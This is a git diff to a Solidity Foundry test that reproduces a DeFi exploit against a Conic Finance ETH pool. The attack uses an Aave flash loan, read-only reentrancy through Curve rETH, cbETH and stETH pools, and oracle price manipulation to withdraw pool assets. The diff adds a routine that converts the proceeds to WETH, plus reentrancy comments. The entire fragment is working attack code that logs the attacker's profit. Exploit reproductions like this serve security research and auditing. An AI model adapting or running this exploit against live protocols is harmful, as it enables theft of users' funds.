@@ -95,6 +95,7 @@ contract ContractTest is Test {
 
         aaveV2Flashloan();
 
+        sellAllTokenToWETH();
         emit log_named_decimal_uint(
             "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
         );
@@ -179,6 +180,7 @@ contract ContractTest is Test {
         );
         reenter_3();
 
+        // repay flashLoan
         rETH_ETH_Pool.exchange(0, 1, 3450 ether, 0); // swap WETH to rETH
         cbETH_ETH_Pool.exchange(0, 1, 850 ether, 0); // swap WETH to cbETH
         ConicEthPool.withdraw(cncETH.balanceOf(address(this)), 0);
@@ -230,14 +232,16 @@ contract ContractTest is Test {
         amount[0] = 0;
 
         nonce++;
-        rETH_ETH_Pool.remove_liquidity(rETH_ETH_LP.balanceOf(address(this)), amount, true, address(this));
+        rETH_ETH_Pool.remove_liquidity(rETH_ETH_LP.balanceOf(address(this)), amount, true, address(this)); // burn rETH/ETH-f, third reentrancy enter point
     }
 
     receive() external payable {
         if (msg.sender != address(WETH)) {
             if (nonce == 1) {
                 emit log_named_decimal_uint(
-                    "In Read-Only-Reentrancy steCRV Price", Oracle.getUSDPrice(address(steCRV)), steCRV.decimals()
+                    "In Read-Only-Reentrancy steCRV Price", 
+                    Oracle.getUSDPrice(address(steCRV)), 
+                    steCRV.decimals()
                 );
                 ConicEthPool.handleDepeggedCurvePool(address(LidoCurvePool)); // set LidoCurvePool as depegged pool
             } else if (nonce == 2) {
@@ -254,7 +258,15 @@ contract ContractTest is Test {
                     rETH_ETH_LP.decimals()
                 );
                 ConicEthPool.withdraw(6292 ether, 0); // withdraw assets from ConicEthPool
+                nonce++;
             }
         }
+    }
+
+    function sellAllTokenToWETH() internal {
+        cbETH_ETH_Pool.exchange(1, 0, cbETH.balanceOf(address(this)), 0);
+        rETH_ETH_Pool.exchange(1, 0, rETH.balanceOf(address(this)), 0);
+        LidoCurvePool.exchange(1, 0, stETH.balanceOf(address(this)), 0);
+        WETH.deposit{value: address(this).balance}();
     }
 }
